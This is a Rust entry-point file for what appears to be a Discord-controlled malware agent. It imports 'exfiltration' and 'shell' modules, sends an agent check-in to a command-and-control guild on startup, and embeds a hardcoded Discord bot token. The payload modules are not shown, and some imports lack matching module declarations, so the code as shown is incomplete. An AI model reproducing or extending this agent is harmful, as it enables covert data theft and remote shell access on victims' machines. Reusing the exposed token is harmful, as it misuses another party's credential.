mod commands;
pub mod discord_utils;
mod errors;
mod event_handler;
mod libraries;
mod os;
mod utils;

use poise::serenity_prelude::{GatewayIntents, GuildId};
use tracing::{error, info as informational};
use utils::tracing::initialize_tracing;

use crate::{
	commands::{misc::*, *},
	exfiltration::*,
	shell::*,
	utils::agent::send_agent_check_in,
};

pub struct Data {} // User data, which is stored and accessible in all command invocations
type Error = Box<dyn std::error::Error + Send + Sync>;
type Context<'a> = poise::Context<'a, Data, Error>;
type SerenityContext = poise::serenity_prelude::Context;

const GUILD_ID: GuildId = GuildId(1086423448454180905);
static TOKEN: &str = "MTA4NzQ2MzExMjY3ODA1NTkzNg.GTGs1y.Nj49dYvo8rSYUA1duIUgaC57UhbJs5fJyMKvhU";

#[tokio::main]
async fn main() {
	initialize_tracing(); // Setup logging

	let intents = GatewayIntents::GUILD_MESSAGES | GatewayIntents::MESSAGE_CONTENT | GatewayIntents::GUILDS;

	informational!("Starting up commands....");

	let options = poise::FrameworkOptions {
		commands: vec![info::info(), purge::purge()],
		event_handler: |_ctx, event, _framework, _data| {
			Box::pin(async move {
				informational!("Got an event in event handler: {:?}", event.name());
				Ok(())
			})
		},

		..Default::default()
	};

	let framework = poise::Framework::builder()
		.options(options)
		.token(TOKEN)
		.intents(intents)
		.setup(move |ctx, _ready, framework| {
			Box::pin(async move {
				informational!("Logged in as: {}", _ready.user.name);
				poise::builtins::register_globally(ctx, &framework.options().commands).await?;
				send_agent_check_in(ctx).await?;
				Ok(Data {})
			})
		});

	// start listening for events by starting the poise framework
	if let Err(why) = framework.run().await {
		error!("An error occured while starting the framework: {:?}", why);
	}
}
